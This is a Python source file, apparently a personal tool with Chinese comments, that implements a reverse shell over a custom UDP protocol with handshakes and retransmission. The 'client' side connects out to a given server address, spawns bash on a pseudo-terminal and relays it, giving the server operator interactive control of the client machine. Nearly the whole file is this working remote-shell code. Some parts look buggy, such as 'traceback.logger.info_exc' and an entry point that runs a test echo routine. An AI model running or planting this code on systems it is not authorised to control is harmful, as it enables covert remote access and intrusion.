#!/usr/bin/env python3
# coding=utf-8
# date 2022-01-12 15:44:57
# author calllivecn <c-all@qq.com>

"""
这里是使用反向shell连接到服务端的, Server是控制端，client是被控制端。
"""

import os
import sys
import pty
import tty
import time
import fcntl
import socket
import struct
import signal
import logging
import termios
import argparse
import traceback
import threading
import selectors
from subprocess import Popen
from functools import wraps


SHELL='bash'
STDIN = sys.stdin.fileno()
# STDIN = sys.stdin
STDOUT = sys.stdout.fileno()

def getlogger(level=logging.INFO):
    logger = logging.getLogger("rshell")
    formatter = logging.Formatter("%(asctime)s %(levelname)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
    consoleHandler = logging.StreamHandler(stream=sys.stdout)
    #logger.setLevel(logging.DEBUG)

    consoleHandler.setFormatter(formatter)

    # consoleHandler.setLevel(logging.DEBUG)
    logger.addHandler(consoleHandler)
    logger.setLevel(level)
    return logger

logger = getlogger()



def get_pty_size(fd):
    size = fcntl.ioctl(fd, termios.TIOCGWINSZ, b"0000") # 占位符
    return struct.unpack("HH", size)

def set_pty_size(fd, columns, rows):
    size = struct.pack("HH", columns, rows)
    # 这个返回还知道是什么
    return fcntl.ioctl(fd, termios.TIOCSWINSZ, size)


# 窗口大小调整
def signal_SIGWINCH_handle(sigNum, frame):
    size = get_pty_size(STDOUT)
    # logger.info(f"窗口大小改变: {size}")
    set_pty_size(STDOUT, *size)
    # logger.info("sigwinch 执行完成")

RTO=30
RTO_COUNT=3
BUF = 1<<16 # 16K


class UDPTranter:
    """
    只需要添加上重传和确认就行，还可以拓展一个一主动重传。
    """

    def __init__(self, addr: str, port: int):

        self.addr = addr
        self.port = port


        self.rto=5
        self.rto_count=5


        # counter ack
        self.counter = 1
        self.packet = struct.Struct("!Q")


    def wrap_rto(func):
        def wrap(self, *args, **kwarg):
            t1 = time.time()
            result = func(self, *args, **kwarg)
            t2 = time.time()

            e = t2-t1
            if result:
                self.rto = e*2
                if self.rto > RTO:
                    self.rto = RTO
            else:
                self.rto = e*1.5

            return result
    
        return wrap
    
    @wrap_rto
    def connect(self):

        # 自动检测是ipv4 ipv6 begin
        sock = None
        for res in socket.getaddrinfo(self.addr, self.port, socket.AF_UNSPEC, socket.SOCK_DGRAM, 0, socket.AI_PASSIVE):
            af, socktype, proto, canonname, sa = res
            try:
                sock = socket.socket(af, socktype, proto)
            except OSError as msg:
                sock = None
                continue
            break
        if sock is None:
            logger.info('could not open socket')
            sys.exit(1)
        
        self.sock = sock
        # end

        # 确认是首次信息，建立连接。
        self.sock.settimeout(self.rto)

        i = 0
        while i < self.rto_count:
            pack = B"O" + self.packet.pack(self.counter)
            self.sock.sendto(pack, (self.addr, self.port))

            
            # 等待确认
            try:
                data, addr = self.sock.recvfrom(32)
            except TimeoutError:
                i += 1
                logger.info(f"握手时，超时重传")

                if i == self.rto_count:
                    raise TimeoutError("connect timeout.")
                
                continue

            if addr[0] == self.addr or addr[1] == self.port and data[:1] == b"A":
                self.sock.connect((self.addr, self.port))
                logger.info("client connect 连接成功")
                self.sock.send(b"O")

                # ack = self.packet.unpack(data[1:9])
                # if ack == self.counter + 1:
                    # self.counter += 1
                    # pack = b"O" + self.packet.pack(self.counter)
                    # self.sock.sendto(pack, (self.addr, self.port))
                # else:
                    # logger.info(f"不是当前确认数据包ACK：{ack} data: {data}")
                    # continue

                logger.info("client ACK O")
                break
            else:
                logger.info(f"有其他人在向这个端口发包, 可能是在探测。data: {data}")
                continue

    @wrap_rto
    def accept(self):

        self.sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        self.sock.bind((self.addr, self.port))

        while True:
            data, addr1 = self.sock.recvfrom(1024)
            if data[:1] == b"O":
                self.sock.connect(addr1)
                self.sock.send(b"A")

                # ack = self.packet.unpack(data[1:9])
                # if ack == self.counter:
                    # self.sock.connect(addr1)
                    # logger.info(f"connected --> {addr1}")
                    # 确认接收
                    # pack = b"A" + self.packet.pack(ack+1)
                    # self.sock.send(pack)

                for i in range(3):
                    data, addr = self.sock.recvfrom(32)
                    if data[:1] == b"O":
                        logger.info(f"握手完成")
                        self.counter += 1
                        return addr1
                    else:
                        continue
                
                logger.info(f"3次握手失败")
            else:
                logger.info(f"{addr1}: 不是新建立连接的请求 data: {data}")


    @wrap_rto
    def send(self, data: bytes):

        self.sock.settimeout(self.rto)
        rto = self.rto

        # for i in range(self.rto_count):
        i = 0
        while i < self.rto_count:
            self.sock.send(b"T" + data)

            # 超时重传
            try:
                data_recv = self.sock.recv(32)
            except TimeoutError:
                i += 1
                logger.info(f"发送数据，超时重传")
                rto *= 2
                self.sock.settimeout(rto)
                continue

            if data_recv[:1] == b"A":
                return len(data)
            else:
                logger.info(f"有其他人在向这个端口发包, 可能是在探测。data: {data_recv}")
                continue
        
        if i >= self.rto_count:
            logger.info(f"发送没有收到确认...")

        self.sock.settimeout(None)


    @wrap_rto
    def recv(self) -> bytes:
        self.sock.settimeout(None)

        flag=True
        while flag:

            data = self.sock.recv(1024)
            logger.info(f"sock.recv() --> data: {data}")

            if data[:1] == b"E":
                self.sock.send(b"A")
                redata = b""
                return redata

            elif data[:1] == b"T":
                self.sock.send(b"A")
                redata = data[1:]
                return redata

            else:
                logger.info(f"不正确的数据包: {data}")

        self.sock.settimeout(self.rto)


    def close(self):
        self.sock.close()


# UDP
def socketshell_udp(sock, size):
    try:
        env = os.environ.copy()
        pty_master, pty_slave = pty.openpty()

        # 设置对面 终端大小
        set_pty_size(pty_slave, *size)

        ss = selectors.DefaultSelector()

        ss.register(pty_master, selectors.EVENT_READ)
        ss.register(sock.sock, selectors.EVENT_READ)

        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)

        while p.poll() is None:

            for key, event in ss.select():
                fd = key.fileobj
                if fd == sock:
                    data = sock.recv()
                    logger.info("recv:", data)
                    
                    # 在peer挂掉的情况下会出现
                    if data == b"":
                        p.communicate()
                        break

                    os.write(pty_master, data)

                elif fd == pty_master:
                    data = os.read(pty_master, 1024)
                    if data:
                        sock.send(data)

            #logger.info("新的一轮 select()")
    except Exception as e:
        # raise e
        logger.info(f"捕获到异常退出: {e}")

    finally:
        sock.close()
        ss.close()
        logger.info("sock exit")


def server_udp(addr, port):

    server_addr = (addr, port)

    logger.info(sys.argv[0], "listen: ", server_addr)

    try:
        signal.signal(signal.SIGWINCH, signal_SIGWINCH_handle)

        # sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        # sock.bind(server_addr)
        # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
        # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)

        sock = UDPTranter(addr, port)

        addr = sock.accept()
        logger.info(f"有反向shell连接上: {addr}")


        size = get_pty_size(STDIN)
        logger.info(f"向对面发送终端大小： {size}")
        sock.send(struct.pack("!HH", *size))
    
        # tty 
        tty_bak = termios.tcgetattr(STDIN)
        # tty.setraw(STDIN)
        # 根这样没有关系。。。
        tty.setraw(STDIN, termios.TCSADRAIN)

        ss = selectors.DefaultSelector()
        ss.register(sock.sock, selectors.EVENT_READ)
        ss.register(STDIN, selectors.EVENT_READ)

        exit_flag = True
        while exit_flag:
            for key, event in ss.select():
                fd = key.fileobj
                if fd == sock.sock:
                    # data = client.recv(1024)
                    data = sock.recv()
                    if data == b"":
                        exit_flag = False
                        break
                    os.write(STDOUT, data)
                elif fd == STDIN:
                    data = os.read(STDIN, 1024)
                    sock.send(data)

    except Exception:
        traceback.logger.info_exc()

    finally:
        sock.close()
        ss.close()
        termios.tcsetattr(STDIN, termios.TCSADRAIN, tty_bak)
        logger.info("logout")


def client_udp(addr, port=6789):
    if addr == "":
        logger.info("client 需要 server 地址")
        return
    
    server_addr = (addr, port)

    sock = UDPTranter(addr, port)
    

    # UDP connect 只是绑定两端
    while True:
        try:
            sock.connect()
        except TimeoutError:
            logger.info(f"连接超时。。。重新连接")
            continue
        except Exception:
            traceback.logger.info_exc()
            time.sleep(10)
            continue


        # 拿到初始化终端大小
        size = sock.recv()
        size = struct.unpack("!HH", size)

        logger.info(f"client connect: {server_addr}")
        th = threading.Thread(target=socketshell_udp, args=(sock, size), daemon=True)
        th.start()
        th.join()
        logger.info(f"连接server: {server_addr}, 正常退出")


def main():
    parse = argparse.ArgumentParser(
        usage="%(prog)s <命令> [option]",
        description="反向shell连接",
        epilog="END",
    )

    # parse.add_argument("--client", action="store_true", help="使用client端")
    # parse.add_argument("--addr", default="", help="需要连接的IP或域名")
    # parse.add_argument("--port", default=6789, type=int, help="端口")

    subparsers = parse.add_subparsers(title="指令", metavar="")
    server_func =  subparsers.add_parser("server", help="启动服务端")
    client_func = subparsers.add_parser("client", help="使用client端")

    # server_func.add_argument("--cmd", default=SHELL, help=f"需要使用的交互程序(default: {SHELL})")
    server_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    server_func.add_argument("--port", default=6789, type=int, help="端口")

    client_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    client_func.add_argument("--port", default=6789, type=int, help="端口")

    parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)

    server_func.set_defaults(func=lambda args :server_udp(args.addr, args.port))
    
    client_func.set_defaults(func=lambda args :client_udp(args.addr, args.port))

    args = parse.parse_args()

    if args.parse:
        logger.info(args)
        sys.exit(0)
    
    return args.func(args)

    # parse.logger.info_help()
    # sys.exit(1)

def S():
    sock = UDPTranter("::", 6789)

    addr = sock.accept()

    i = 0
    while i <= 10:
        i += 1
        sock.send(str(i).encode())
        logger.info(f"server: send() --> {i}")

        data = sock.recv()
        if data == b"":
            logger.info("client close()")
            break

        logger.info(f"server: recv() --> {data}")
        time.sleep(0.1)
    
    sock.close()

def C(addr):

    sock = UDPTranter(addr, 6789)

    sock.connect()

    # while (data:= sock.recv()) == b"":
    while True:
        data = sock.recv()
        if not data:
            logger.info(f"peer close()")
            break

        logger.info(f"client: recv() --> {data}")

        msg = b"echo: " + data
        logger.info(f'client: send() --> {msg}')
        sock.send(msg)
    
    sock.close()


def testudp(arg, arg2):
    if arg == "S":
        S()
    elif arg == "C":
        C(arg2)


if __name__ == "__main__":
    testudp(sys.argv[1], sys.argv[2])
    # main()